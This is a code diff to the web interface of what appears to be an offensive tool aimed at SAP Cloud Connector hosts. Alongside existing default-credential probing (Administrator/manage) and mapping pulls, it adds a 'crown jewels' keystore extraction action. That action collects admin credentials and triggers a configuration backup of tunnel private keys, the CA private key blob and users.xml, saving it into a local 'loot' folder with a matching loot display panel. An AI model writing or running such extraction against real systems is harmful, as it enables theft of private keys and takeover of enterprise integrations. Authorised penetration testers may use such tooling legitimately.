@@ -793,6 +793,7 @@ body {
   <div class="ctx-item" data-action="scc_probe_creds">&#128273; Probe Default Account (Administrator/manage)</div>
   <div class="ctx-item" data-action="scc_pull_mappings">&#128194; Pull Mappings (prompts for user/pwd)</div>
   <div class="ctx-item" data-action="scc_probe_mappings">&#128225; Probe Mappings (TCP/HTTP smoke test)</div>
+  <div class="ctx-item" data-action="scc_extract_keystore" style="color:#f85149">&#128272; Extract Keystore (FULL BACKUP — CROWN JEWELS)</div>
   <div class="ctx-sep"></div>
   <div class="ctx-item" data-action="scc_delete" style="color:#f85149">&#128465; Remove from Map</div>
 </div>
@@ -2615,6 +2616,7 @@ document.getElementById('scc-ctx-menu').addEventListener('click', function(e) {
     case 'scc_probe_creds':   sccProbeCreds(host); break;
     case 'scc_pull_mappings': sccPullMappings(host); break;
     case 'scc_probe_mappings': sccProbeMappings(host); break;
+    case 'scc_extract_keystore': sccExtractKeystore(host); break;
     case 'scc_delete':        sccRemoveFromMap(host); break;
   }
 });
@@ -3450,6 +3452,13 @@ function showSCCDetail(host) {
                (sn.cves_suspected || []).map(c => `<div class="detail-row"><span class="detail-key" style="color:#d29922">suspected</span><span class="detail-val" style="font-family:monospace">${escHtml(c)}</span></div>`).join('');
       })()}
     </div>` : ''}
+    ${sn.keystore_extracted ? `
+    <div class="detail-section" style="border-left:3px solid #f85149;padding-left:8px">
+      <h4 style="color:#f85149">&#128272; Keystore Loot</h4>
+      <div class="detail-row"><span class="detail-key">Loot path</span><span class="detail-val" style="font-family:monospace;font-size:10px;word-break:break-all">${escHtml(sn.keystore_loot_path || '?')}</span></div>
+      ${sn.tunnel_privkey_fp ? `<div class="detail-row"><span class="detail-key">System P12 sha256</span><span class="detail-val" style="font-family:monospace;font-size:10px;word-break:break-all">${escHtml(sn.tunnel_privkey_fp)}</span></div>` : ''}
+      ${sn.pp_ca_privkey_fp ? `<div class="detail-row"><span class="detail-key">SSFS sha256</span><span class="detail-val" style="font-family:monospace;font-size:10px;word-break:break-all" title="SAP Secure Storage File System — contains the principal-propagation CA private key when configured">${escHtml(sn.pp_ca_privkey_fp)}</span></div>` : ''}
+    </div>` : ''}
     ${(sn.ha_role || sn.ha_shadow_host) ? `
     <div class="detail-section">
       <h4>High Availability</h4>
@@ -3510,6 +3519,7 @@ function showSCCDetail(host) {
         <button class="ctx-btn" onclick="sccProbeCreds('${escHtml(host)}')" style="background:#21262d;border:1px solid #30363d;color:#e6edf3;padding:6px 10px;border-radius:4px;cursor:pointer;text-align:left">&#128273; Probe default creds <span style="color:#8b949e;font-size:10px">(1 POST · Administrator/manage)</span></button>
         <button class="ctx-btn" onclick="sccPullMappings('${escHtml(host)}')" style="background:#21262d;border:1px solid #30363d;color:#e6edf3;padding:6px 10px;border-radius:4px;cursor:pointer;text-align:left">&#128194; Pull mappings <span style="color:#8b949e;font-size:10px">(prompts user/pwd)</span></button>
         <button class="ctx-btn" onclick="sccProbeMappings('${escHtml(host)}')" style="background:#21262d;border:1px solid #30363d;color:#e6edf3;padding:6px 10px;border-radius:4px;cursor:pointer;text-align:left">&#128225; Probe mappings <span style="color:#8b949e;font-size:10px">(TCP/HTTP smoke test)</span></button>
+        <button class="ctx-btn" onclick="sccExtractKeystore('${escHtml(host)}')" style="background:#21262d;border:1px solid #f85149;color:#f85149;padding:6px 10px;border-radius:4px;cursor:pointer;text-align:left">&#128272; Extract keystore <span style="color:#8b949e;font-size:10px">(full backup zip — crown jewels)</span></button>
       </div>
     </div>
   `;
@@ -3542,6 +3552,30 @@ async function sccPullMappings(host) {
     const d = await r.json();
     if (d.error) alert('Pull failed: ' + d.error);
   } catch (e) { alert('Pull error: ' + e); }
+}
+
+async function sccExtractKeystore(host) {
+  if (!confirm('EXTRACT FULL SCC KEYSTORE BACKUP from ' + host + '?\n\n' +
+               'This calls POST /api/v1/configuration/backup which returns a zip ' +
+               'containing every tunnel client cert + private key, the system ' +
+               'identity keystore, the SSFS blob (PP CA private key), and the ' +
+               'local users.xml.\n\n' +
+               'The zip will be saved under ./loot/scc/' + host + '/ with mode 0600. ' +
+               'Treat as crown-jewels material.')) return;
+  const u = prompt('SCC admin username for ' + host + ':', 'Administrator');
+  if (!u) return;
+  const p = prompt('Password for ' + u + ':');
+  if (!p) return;
+  const bp = prompt('Backup encryption password (passphrase that locks keystores in the zip):', p);
+  if (!bp) return;
+  try {
+    flashActivity('SCC ' + host + ': extracting keystore', 30000);
+    const r = await fetch('/api/scc/' + encodeURIComponent(host) + '/extract_keystore',
+                          { method: 'POST', headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ username: u, password: p, backup_password: bp }) });
+    const d = await r.json();
+    if (d.error) alert('Extraction failed: ' + d.error);
+  } catch (e) { alert('Extraction error: ' + e); }
 }
 
 async function sccProbeMappings(host) {
